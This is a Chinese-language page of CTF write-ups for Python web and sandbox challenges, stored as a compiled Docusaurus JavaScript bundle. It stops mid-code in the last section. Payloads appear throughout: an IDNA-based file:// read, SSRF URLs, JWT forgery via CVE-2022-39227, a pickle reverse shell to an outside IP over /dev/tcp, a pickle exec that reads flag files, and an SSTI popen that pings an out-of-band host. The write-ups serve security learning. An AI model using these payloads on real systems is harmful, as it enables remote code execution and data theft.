"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[4062],{3199:(n,e,r)=>{r.r(e),r.d(e,{assets:()=>o,contentTitle:()=>l,default:()=>p,frontMatter:()=>a,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"CTF/Misc/ctf-python","title":"ctf-python","description":"[DubheCTF 2024] ezPythonCheckin","source":"@site/docs/CTF/Misc/ctf-python.md","sourceDirName":"CTF/Misc","slug":"/CTF/Misc/ctf-python","permalink":"/docs/CTF/Misc/ctf-python","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/CTF/Misc/ctf-python.md","tags":[],"version":"current","frontMatter":{},"sidebar":"CTFSidebar","previous":{"title":"ctf-nodejs","permalink":"/docs/CTF/Misc/ctf-nodejs"},"next":{"title":"\u9e64\u57ce\u676f 2021EasyP","permalink":"/docs/CTF/Misc/nss"}}');var t=r(4848),i=r(8453);const a={},l=void 0,o={},c=[{value:"[DubheCTF 2024] ezPythonCheckin",id:"dubhectf-2024-ezpythoncheckin",level:2},{value:"[SUCTF 2019]Pythonginx(\u7279\u6b8a\u5b57\u7b26\u7ed5\u8fc7)",id:"suctf-2019pythonginx\u7279\u6b8a\u5b57\u7b26\u7ed5\u8fc7",level:2},{value:"Python\u91cc\u7684SSRF",id:"python\u91cc\u7684ssrf",level:2},{value:"Ye&#39;s Pickle(jwt\u4f2a\u9020\uff0cpickle\u53cd\u5e8f\u5217\u5316)",id:"yes-picklejwt\u4f2a\u9020pickle\u53cd\u5e8f\u5217\u5316",level:2},{value:"\u6781\u5ba2\u5927\u6311\u62182023",id:"\u6781\u5ba2\u5927\u6311\u62182023",level:2},{value:"ezpython",id:"ezpython",level:3},{value:"klf_ssti",id:"klf_ssti",level:3},{value:"klf_2",id:"klf_2",level:3},{value:"polar flask_pin",id:"polar-flask_pin",level:2}];function d(n){const e={a:"a",blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",...(0,i.R)(),...n.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(e.h2,{id:"dubhectf-2024-ezpythoncheckin",children:"[DubheCTF 2024] ezPythonCheckin"}),"\n",(0,t.jsx)(e.p,{children:"\u6e90\u7801"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:'import atexit\r\nimport base64\r\nimport json\r\nimport os\r\nimport subprocess\r\nfrom tempfile import NamedTemporaryFile\r\n\r\nblack_list = [\r\n    "nosec",\r\n    "import",\r\n    "load",\r\n    "\'\'",\r\n    \'""\',\r\n    "[]",\r\n    "{}",\r\n    "().",\r\n    "builtins",\r\n    "dict",\r\n    "dir",\r\n    "locals",\r\n    "base",\r\n    "classes",\r\n    "+",\r\n    "mro",\r\n    "attribute",\r\n    "id",\r\n]\r\n\r\n\r\ndef main():\r\n    print("Hello!")\r\n    print("Please send base64 encoded string!")\r\n    data = input("> ")\r\n\r\n    if len(data) > 1600:\r\n        print("Too long")\r\n        return\r\n\r\n    decode_data = base64.b64decode(data).decode()\r\n    if any(item in decode_data for item in black_list):\r\n        print("Not Safe")\r\n        return\r\n\r\n    with NamedTemporaryFile("wt", suffix=".py", delete=False, encoding="utf-8") as f:\r\n        f.write(decode_data)\r\n        temp_filename = f.name\r\n    atexit.register(os.remove, temp_filename)\r\n\r\n    check_result = json.loads(\r\n        subprocess.run(\r\n            ["bandit", "-r", temp_filename, "-f", "json"],\r\n            capture_output=True,\r\n            encoding="utf-8",\r\n        ).stdout\r\n    )\r\n\r\n    if len(check_result["results"]) == 0:\r\n        print("[+] OK")\r\n        subprocess.run(["python3", temp_filename], timeout=60)\r\n        print("[+] Over")\r\n    else:\r\n        print("[+] Not Safe")\r\n    return\r\n\r\n\r\nif __name__ == "__main__":\r\n    try:\r\n        main()\r\n    except Exception:\r\n        print(b"[+] FAILED!")\r\n        pass\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u9ed1\u540d\u5355\uff0c\u8fc7\u6ee4\u4e86\u5f88\u591a"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:'black_list = [\r\n    "nosec",\r\n    "import",\r\n    "load",\r\n    "\'\'",\r\n    \'""\',\r\n    "[]",\r\n    "{}",\r\n    "().",\r\n    "builtins",\r\n    "dict",\r\n    "dir",\r\n    "locals",\r\n    "base",\r\n    "classes",\r\n    "+",\r\n    "mro",\r\n    "attribute",\r\n    "id",\r\n]\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u6ca1\u6709\u8fc7\u6ee4open\uff0c\u6211\u4eec\u76f4\u63a5open\u8bfb\u53d6\u6587\u4ef6"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"with open('/flag', 'r') as file:\r\n    content = file.read()\r\nprint(content)\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"d2l0aCBvcGVuKCcvZmxhZycsICdyJykgYXMgZmlsZToKICAgIGNvbnRlbnQgPSBmaWxlLnJlYWQoKQpwcmludChjb250ZW50KQ==\n"})}),"\n",(0,t.jsx)(e.h2,{id:"suctf-2019pythonginx\u7279\u6b8a\u5b57\u7b26\u7ed5\u8fc7",children:"[SUCTF 2019]Pythonginx(\u7279\u6b8a\u5b57\u7b26\u7ed5\u8fc7)"}),"\n",(0,t.jsx)(e.p,{children:"\u6e90\u7801"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:"@app.route('/getUrl', methods=['GET', 'POST'])\r\ndef getUrl():\r\n    url = request.args.get(\"url\")\r\n    host = parse.urlparse(url).hostname\r\n    if host == 'suctf.cc':\r\n        return \"\u6211\u624c your problem? 111\"\r\n    parts = list(urlsplit(url))\r\n    host = parts[1]\r\n    if host == 'suctf.cc':\r\n        return \"\u6211\u624c your problem? 222 \" + host\r\n    newhost = []\r\n    for h in host.split('.'):\r\n        newhost.append(h.encode('idna').decode('utf-8'))\r\n    parts[1] = '.'.join(newhost)\r\n    #\u53bb\u6389 url \u4e2d\u7684\u7a7a\u683c\r\n    finalUrl = urlunsplit(parts).split(' ')[0]\r\n    host = parse.urlparse(finalUrl).hostname\r\n    if host == 'suctf.cc':\r\n        return urllib.request.urlopen(finalUrl).read()\r\n    else:\r\n        return \"\u6211\u624c your problem? 333\"\n"})}),"\n",(0,t.jsx)(e.p,{children:"urlparse\u548curlsplit\u51fd\u6570\u90fd\u53ef\u4ee5\u5206\u89e3url"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:"import urllib\r\nimport urllib.parse\r\n\r\nurl = 'http://www.baidu.com/index.html;user?id=5#comment'\r\n\r\nresult = urllib.parse.urlparse(url)\r\nresult1 = urllib.parse.urlsplit(url)\r\n\r\nprint(result,'\\n',result1)\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u7ed3\u679c"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"ParseResult(scheme='http', netloc='www.baidu.com', path='/index.html', params='user', query='id=5', fragment='comment')\r\nSplitResult(scheme='http', netloc='www.baidu.com', path='/index.html;user', query='id=5', fragment='comment')\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u8fd9\u4e2a\u4ee3\u7801\u662f\uff0c\u524d\u4e24\u6b21host\u4e0d\u80fd\u7b49\u4e8esuctf.cc\uff0c\u6700\u540e\u4e00\u6b21\u7b49\u4e8esuctf.cc"}),"\n",(0,t.jsx)(e.p,{children:"\u5173\u952e\u70b9\u5728"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"for h in host.split('.'):\r\n        newhost.append(h.encode('idna').decode('utf-8'))\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u5148idna\u7f16\u7801\uff0c\u5728utf-8\u89e3\u7801\uff0c\u90a3\u5c31\u627e\u4e00\u4e9bunicode\u7f16\u7801\uff08\u7ecf\u8fc7\u8fd9\u6837\u540e\uff0c\u662f\u6b63\u5e38\u7684\u5b57\u6bcd\uff09"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:"chars = ['s', 'u', 'c', 't', 'f']\r\n\r\nfor c in chars:\r\n\tfor i in range(0x7f, 0x10FFFF):\r\n\t\ttry:\r\n\t\t\tchar_i = chr(i).encode('idna').decode('utf-8')\r\n\t\t\tif char_i == c:\r\n\t\t\t\tprint('ASCII: {}   Unicode: {}    Number: {}'.format(c, chr(i), i))\r\n\t\texcept:\r\n\t\t\tpass\n"})}),"\n",(0,t.jsx)(e.p,{children:"payload"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"file://\uff33uctf.cc/usr/local/nginx/conf/nginx.conf \u8bfb\u53d6nginx\u7684\u914d\u7f6e\u6587\u4ef6\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"file://\uff33uctf.cc/usr/fffffflag\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.a,{href:"https://www.cnblogs.com/hackerone/p/17509147.html",children:"\u53c2\u8003"})}),"\n",(0,t.jsx)(e.h2,{id:"python\u91cc\u7684ssrf",children:"Python\u91cc\u7684SSRF"}),"\n",(0,t.jsx)(e.p,{children:"\u9898\u76ee\u63cf\u8ff0"}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:"\u5c1d\u8bd5\u8bbf\u95ee\u5230\u5bb9\u5668\u5185\u90e8\u7684 8000 \u7aef\u53e3\u548c url path /api/internal/secret \u5373\u53ef\u83b7\u53d6 flag"}),"\n"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"127.0.0.1\u88ab\u8fc7\u6ee4\r\n2130706433\u88ab\u8fc7\u6ee4\r\n0\u6ca1\u88ab\u8fc7\u6ee4\r\nsudo.cc\u6ca1\u8fc7\u6ee4\n"})}),"\n",(0,t.jsx)(e.p,{children:"payload"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"url=http://0:8000/api/internal/secret\r\nurl=http://sudo.cc:8000/api/internal/secret \u9700\u8981\u591a\u70b9\u51e0\u4e0b\n"})}),"\n",(0,t.jsx)(e.h2,{id:"yes-picklejwt\u4f2a\u9020pickle\u53cd\u5e8f\u5217\u5316",children:"Ye's Pickle(jwt\u4f2a\u9020\uff0cpickle\u53cd\u5e8f\u5217\u5316)"}),"\n",(0,t.jsx)(e.p,{children:"\u6e90\u7801"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:'# -*- coding: utf-8 -*-\r\nimport base64\r\nimport string\r\nimport random\r\nfrom flask import *\r\nimport jwcrypto.jwk as jwk\r\nimport pickle\r\nfrom python_jwt import *\r\napp = Flask(__name__)\r\n\r\ndef generate_random_string(length=16):\r\n    characters = string.ascii_letters + string.digits  # \u5305\u542b\u5b57\u6bcd\u548c\u6570\u5b57\r\n    random_string = \'\'.join(random.choice(characters) for _ in range(length))\r\n    return random_string\r\napp.config[\'SECRET_KEY\'] = generate_random_string(16)\r\nkey = jwk.JWK.generate(kty=\'RSA\', size=2048)\r\n@app.route("/")\r\ndef index():\r\n    payload=request.args.get("token")\r\n    if payload:\r\n        token=verify_jwt(payload, key, [\'PS256\'])\r\n        session["role"]=token[1][\'role\']\r\n        return render_template(\'index.html\')\r\n    else:\r\n        session["role"]="guest"\r\n        user={"username":"boogipop","role":"guest"}\r\n        jwt = generate_jwt(user, key, \'PS256\', timedelta(minutes=60))\r\n        return render_template(\'index.html\',token=jwt)\r\n\r\n@app.route("/pickle")\r\ndef unser():\r\n    if session["role"]=="admin":\r\n        pickle.loads(base64.b64decode(request.args.get("pickle")))\r\n        return render_template("index.html")\r\n    else:\r\n        return render_template("index.html")\r\nif __name__ == "__main__":\r\n    app.run(host="0.0.0.0", port=5000, debug=True)\n'})}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:"\u6839\u8def\u7531\uff0c\u6784\u9020jwt\u7684\u503c"}),"\n"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:'@app.route("/")\r\ndef index():\r\n    payload=request.args.get("token") # \u83b7\u53d6\u4e00\u4e2aGET\u53c2\u6570\r\n    if payload:\r\n        token=verify_jwt(payload, key, [\'PS256\'])\r\n        session["role"]=token[1][\'role\']\r\n        return render_template(\'index.html\')\r\n    else:\r\n        session["role"]="guest"\r\n        user={"username":"boogipop","role":"guest"}\r\n        jwt = generate_jwt(user, key, \'PS256\', timedelta(minutes=60))\r\n        return render_template(\'index.html\',token=jwt)\n'})}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:"pickle\u8def\u7531\uff0crole\u7b49\u4e8eadmin\u5c31pickle\u53cd\u5e8f\u5217\u5316\uff08\u6ca1\u5565\u8fc7\u6ee4\uff09"}),"\n"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:'@app.route("/pickle")\r\ndef unser():\r\n    if session["role"]=="admin":\r\n        pickle.loads(base64.b64decode(request.args.get("pickle")))\r\n        return render_template("index.html")\r\n    else:\r\n        return render_template("index.html")\n'})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240320202530199.png",alt:"image-20240320202530199"})}),"\n",(0,t.jsxs)(e.p,{children:["\u63a5\u7740\u5c31\u8981\u6784\u9020jwt\uff0c\u8fd9\u91cc\u5229\u7528",(0,t.jsx)(e.a,{href:"https://github.com/user0x1337/CVE-2022-39227",children:"CVE-2022-39227"}),"\u8fd9\u4e2a\u6f0f\u6d1e"]}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:"poc\u7684\u7528\u6cd5"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:'python3 cve_2022_39227.py -j <JWT-WEBTOKEN> -i "<KEY>=<VALUE>"\n'})}),"\n"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:'python main.py -j eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA5MzcxMDksImlhdCI6MTcxMDkzMzUwOSwianRpIjoiUFdCYU9MU1pKdGNUbDB1ZGpqNFROZyIsIm5iZiI6MTcxMDkzMzUwOSwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.TZmuJn65uPPGzalHMQLQWz13J_bKa8FZkvYZ3mXoGALIQXXCJvNTmpTrvbPttBE1DSnGsSAdV4yYUTCpVbgSIZ1xRJPNCFe1zIW81QUpZIj9dFLvnXTnzejgDU6EDXCBts2YIjuHNgzq4A29j3j6hRBnRZRe420ltCU2LX9nzTTKeo5HxNzHUGHfl5PsA_D9gxRyLAtawIeyTrDheSEzYv6RLOXkdPAwK-zH57MYU_FuLr2JDRKxey372uxBReISv5FArNaHMk5y_BgvtxxjTl4S64XqGNnRrk8Xu0UQ8qLZezC1ZeCG_ErT4-CjkOm0p0VtkIHozrcx6TjF0G-n4A -i "role=admin"\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u901a\u8fc7get\u8fdb\u884c\u4f20\u53c2\uff0c\u8ba9role=admin"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-http",children:"GET /?token={%22%20%20eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA5MzcxMDksImlhdCI6MTcxMDkzMzUwOSwianRpIjoiUFdCYU9MU1pKdGNUbDB1ZGpqNFROZyIsIm5iZiI6MTcxMDkzMzUwOSwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiJib29naXBvcCJ9.%22:%22%22,%22protected%22:%22eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9%22,%20%22payload%22:%22eyJleHAiOjE3MTA5MzcxMDksImlhdCI6MTcxMDkzMzUwOSwianRpIjoiUFdCYU9MU1pKdGNUbDB1ZGpqNFROZyIsIm5iZiI6MTcxMDkzMzUwOSwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9%22,%22signature%22:%22TZmuJn65uPPGzalHMQLQWz13J_bKa8FZkvYZ3mXoGALIQXXCJvNTmpTrvbPttBE1DSnGsSAdV4yYUTCpVbgSIZ1xRJPNCFe1zIW81QUpZIj9dFLvnXTnzejgDU6EDXCBts2YIjuHNgzq4A29j3j6hRBnRZRe420ltCU2LX9nzTTKeo5HxNzHUGHfl5PsA_D9gxRyLAtawIeyTrDheSEzYv6RLOXkdPAwK-zH57MYU_FuLr2JDRKxey372uxBReISv5FArNaHMk5y_BgvtxxjTl4S64XqGNnRrk8Xu0UQ8qLZezC1ZeCG_ErT4-CjkOm0p0VtkIHozrcx6TjF0G-n4A%22} HTTP/1.1\r\nHost: f8c1adf2-03c7-4d41-a6c0-5c3bde12b829.node5.buuoj.cn:81\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nReferer: http://f8c1adf2-03c7-4d41-a6c0-5c3bde12b829.node5.buuoj.cn:81/\r\nCookie: session=eyJyb2xlIjoiZ3Vlc3QifQ.ZfrJNw.Uix84ZTCM9TKnr_Sdv0KQ2kJBsI\r\nUpgrade-Insecure-Requests: 1\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240320203033539.png",alt:"image-20240320203033539"})}),"\n",(0,t.jsx)(e.p,{children:"\u5c06\u8fd9\u4e2a\u89e3\u7801\uff0crole\u7b49\u4e8eadmin\u5c31\u4ee3\u8868\u6210\u529f\u4e86"}),"\n",(0,t.jsx)(e.p,{children:"\u63a5\u7740\u5c31\u662fpickle\u53cd\u5e8f\u5217\u5316\uff0c\u7531\u4e8e\u6ca1\u6709\u4efb\u4f55\u8fc7\u6ee4\uff0c\u76f4\u63a5\u53cd\u5f39shell"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:"import base64\r\nopcode=b'''cos\r\nsystem\r\n(S\"bash -c 'bash -i >& /dev/tcp/119.28.136.36/9001 0>&1'\"\r\ntR.\r\n'''\r\nprint(base64.b64encode(opcode))\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u8fd9\u91cc\u6211\u8bd5\u4e86\u597d\u4e45\uff0c\u53cd\u5f39\u4e0d\u6210\u529f"}),"\n",(0,t.jsxs)(e.p,{children:["\u8fd8\u53ef\u4ee5\u5229\u7528\u62a5\u9519\u8fdb\u884c\u56de\u663e\uff0c",(0,t.jsx)(e.strong,{children:"\u524d\u63d0\u662f\u5f97\u5f00\u542fdebug"})]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:"import pickle\r\nimport base64\r\n\r\nclass A():\r\n\tdef __reduce__(self):\r\n\t\treturn (exec,(\"raise Exception(__import__('os').popen('cat /f*').read())\",))\r\n\r\n\r\npoc = base64.b64encode(pickle.dumps(A()))\r\nprint(poc)\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240320203447886.png",alt:"image-20240320203447886"})}),"\n",(0,t.jsx)(e.h2,{id:"\u6781\u5ba2\u5927\u6311\u62182023",children:"\u6781\u5ba2\u5927\u6311\u62182023"}),"\n",(0,t.jsx)(e.h3,{id:"ezpython",children:"ezpython"}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:"\u9898\u76ee\u63cf\u8ff0\uff1acan you pollute me?"}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:"\u76f4\u63a5\u7ed9\u4e86\u6e90\u7801"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:"import json\r\nimport os\r\n\r\nfrom waf import waf\r\nimport importlib\r\nfrom flask import Flask,render_template,request,redirect,url_for,session,render_template_string\r\n\r\napp = Flask(__name__)\r\napp.secret_key='jjjjggggggreekchallenge202333333'\r\nclass User():\r\n    def __init__(self):\r\n        self.username=\"\"\r\n        self.password=\"\"\r\n        self.isvip=False\r\n\r\n\r\nclass hhh(User):\r\n    def __init__(self):\r\n        self.username=\"\"\r\n        self.password=\"\"\r\n\r\nregistered_users=[]\r\n@app.route('/')\r\ndef hello_world():  # put application's code here\r\n    return render_template(\"welcome.html\")\r\n\r\n@app.route('/play')\r\ndef play():\r\n    username=session.get('username')\r\n    if username:\r\n        return render_template('index.html',name=username)\r\n    else:\r\n        return redirect(url_for('login'))\r\n\r\n@app.route('/login',methods=['GET','POST'])\r\ndef login():\r\n    if request.method == 'POST':\r\n        username=request.form.get('username')\r\n        password=request.form.get('password')\r\n        user = next((user for user in registered_users if user.username == username and user.password == password), None)\r\n        if user:\r\n            session['username'] = user.username\r\n            session['password']=user.password\r\n            return redirect(url_for('play'))\r\n        else:\r\n            return \"Invalid login\"\r\n        return redirect(url_for('play'))\r\n    return render_template(\"login.html\")\r\n\r\n@app.route('/register',methods=['GET','POST'])\r\ndef register():\r\n    if request.method == 'POST':\r\n        try:\r\n            if waf(request.data):\r\n                return \"fuck payload!Hacker!!!\"\r\n            data=json.loads(request.data)\r\n            if \"username\" not in data or \"password\" not in data:\r\n                return \"\u8fde\u7528\u6237\u540d\u5bc6\u7801\u90fd\u6ca1\u6709\u4f60\u6ce8\u518c\u5565\u5462\"\r\n            user=hhh()\r\n            merge(data,user)\r\n            registered_users.append(user)\r\n        except Exception as e:\r\n            return \"\u6cf0\u9177\u8fa3,\u6ca1\u6709\u6ce8\u518c\u6210\u529f\u634f\"\r\n        return redirect(url_for('login'))\r\n    else:\r\n        return render_template(\"register.html\")\r\n\r\n@app.route('/flag',methods=['GET'])\r\ndef flag():\r\n    user = next((user for user in registered_users if user.username ==session['username']  and user.password == session['password']), None)\r\n    if user:\r\n        if user.isvip:\r\n            data=request.args.get('num')\r\n            if data:\r\n                if '0' not in data and data != \"123456789\" and int(data) == 123456789 and len(data) <=10:\r\n                        return render_template('flag.html',flag=\"flag{you_win}\")\r\n                else:\r\n                    return \"\u4f60\u7684\u6570\u5b57\u4e0d\u5bf9\u54e6!\"\r\n            else:\r\n                return \"I need a num!!!\"\r\n        else:\r\n            return render_template_string('\u8fd9\u79cd\u795e\u529f\u4f60\u4e0d\u5145VIP\u4e5f\u60f3\u5b66?<p><img src=\"{{url_for(\\'static\\',filename=\\'weixin.png\\')}}\">\u8981\u4e0dv\u621150,\u6211\u9001\u4f60\u4e00\u4e2aVIP\u5427,\u563b\u563b</p>')\r\n    else:\r\n        return \"\u5148\u767b\u5f55\u53bb\"\r\n\r\ndef merge(src, dst):\r\n    for k, v in src.items():\r\n        if hasattr(dst, '__getitem__'):\r\n            if dst.get(k) and type(v) == dict:\r\n                merge(v, dst.get(k))\r\n            else:\r\n                dst[k] = v\r\n        elif hasattr(dst, k) and type(v) == dict:\r\n            merge(v, getattr(dst, k))\r\n        else:\r\n            setattr(dst, k, v)\r\n\r\n\r\nif __name__ == '__main__':\r\n    app.run(host=\"0.0.0.0\",port=\"8888\")\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u6709merge\u51fd\u6570\uff0c\u731c\u6d4b\u53ef\u80fd\u662fpython\u539f\u578b\u94fe\u6c61\u67d3"}),"\n",(0,t.jsx)(e.p,{children:"\u770b\u4e86flag\u8def\u7531\uff0c\u5173\u952e\u662f\u8ba9isvip\u7b49\u4e8eTrue\uff08\u8fd9\u91ccisvip\u7b49\u4e8eflase\u7684\u8bdd\uff0c\u8bbf\u95eeflag\u5c31\u4f1a\u7206500\uff09"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:'class User():\r\n    def __init__(self):\r\n        self.username=""\r\n        self.password=""\r\n        self.isvip=False\r\n\r\n\r\nclass hhh(User):\r\n    def __init__(self):\r\n        self.username=""\r\n        self.password=""\r\n\r\n\r\nuser = hhh()\r\nUser = User()\r\nprint(user.__class__) # hhh\u7c7b\r\nuser.__class__.__base__.isvip = True # \u8ba9User\u7c7b\u7684isvip\u5c5e\u6027\u7b49\u4e8eTrue\r\nprint(User.isvip) # \u8fd9\u91cc\u8fd8\u662fflase\uff0c\u56e0\u4e3a\u662f\u76f4\u63a5\u8c03\u7528\u4e86User\u7c7b\u4e2d\u7684isvip\r\nprint(user.isvip) # \u8fd9\u91cc\u662fTrue\uff0c\u56e0\u4e3ahhh\u7c7b\u4e2d\u6ca1\u6709isvip\u5c5e\u6027\uff0c\u5c31\u4f1a\u627e\u7236\u7c7b\u7684\u5c5e\u6027\n'})}),"\n",(0,t.jsx)(e.p,{children:"payload"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-json",children:'{"username":"admin","password":"123456","__class__":{"__base__":{"\\u0069\\u0073\\u0076\\u0069\\u0070":"True"}}}\n'})}),"\n",(0,t.jsxs)(e.p,{children:["\u8fd9\u91ccisvip\u88ab\u8fc7\u6ee4\u4e86\uff0c\u7528unicode\u7f16\u7801\u7ed5\u8fc7\uff0c\u8fd9\u91cc\u5c31\u76f8\u5f53\u4e8e\u7ed9User()\u7c7b\u6dfb\u52a0\u4e86\u4e00\u4e2a",(0,t.jsx)(e.code,{children:"isvip"}),"\u5c5e\u6027\u5e76\u4e14\u503c\u4e3aTrue"]}),"\n",(0,t.jsx)(e.p,{children:"\u767b\u5f55\u540e\uff0c\u6ca1\u6709\u53d1\u73b0\u5565\u4e1c\u897f\uff0c\u76f4\u63a5\u8bbf\u95eeflag"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:"if '0' not in data and data != \"123456789\" and int(data) == 123456789 and len(data) <=10:\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u8fd9\u91cc\u7528",(0,t.jsx)(e.code,{children:"Non-ASCII Identifies"}),"\u7ed5\u8fc7\uff0c",(0,t.jsx)(e.a,{href:"https://www.compart.com/en/unicode/",children:"https://www.compart.com/en/unicode/"})]}),"\n",(0,t.jsx)(e.p,{children:"\u5728\u8fd9\u4e2a\u7f51\u7ad9\u4e2d\u53ef\u4ee5\u627e\u5230\u4e00\u4e9b\u7279\u6b8a\u7684unicode\u5b57\u7b26"}),"\n",(0,t.jsx)(e.p,{children:"\u4f8b\u5982\uff0c\u6211\u627e\u4e86\u4e00\u4e2a\u4ee3\u8868\u6570\u5b571\u7684\u5b57\u7b26"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240321132309914.png",alt:"image-20240321132309914"})}),"\n",(0,t.jsx)(e.p,{children:"payload"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"num=\u066123456789\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u4ece\u6e90\u7801\u4e2d\u5f97\u5230flag"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240321132448348.png",alt:"image-20240321132448348"})}),"\n",(0,t.jsx)(e.h3,{id:"klf_ssti",children:"klf_ssti"}),"\n",(0,t.jsx)(e.p,{children:"\u8bbf\u95eehack\uff0c\u4f20klf\u53c2\u6570"}),"\n",(0,t.jsx)(e.p,{children:"\u53d1\u73b0\u8f93\u5165\u4ec0\u4e48\u90fd\u56de\u663e"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240321134324884.png",alt:"image-20240321134324884"})}),"\n",(0,t.jsx)(e.p,{children:"\u731c\u6d4b\u662fpython\u7684ssti\u6ce8\u5165"}),"\n",(0,t.jsx)(e.p,{children:"payload"}),"\n",(0,t.jsx)(e.p,{children:"\u8fd9\u4e2a\u5730\u65b9\u662f\u65e0\u56de\u663e\uff0c\u90a3\u5c31\u5229\u7528curl\uff0cping\u8fdb\u884c\u5e26\u5916"}),"\n",(0,t.jsx)(e.p,{children:"\u6211\u8fd9\u662f\u4f7f\u7528windows\u590d\u73b0\u7684\uff0c\u76f4\u63a5ping\u4e86"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"{{config.__class__.__init__.__globals__['os'].popen('ping %USERNAME%.5k7ku.ceye.io').read()}}\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240321134755369.png",alt:"image-20240321134755369"})}),"\n",(0,t.jsx)(e.p,{children:"\u5f97\u5230\u7528\u6237\u540d"}),"\n",(0,t.jsx)(e.h3,{id:"klf_2",children:"klf_2"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:"from flask import Flask, request, render_template, render_template_string,send_from_directory\r\nimport re\r\nimport os\r\n\r\napp = Flask(__name__)\r\n\r\n@app.route('/', methods=['GET', 'POST'])\r\ndef index():\r\n    return 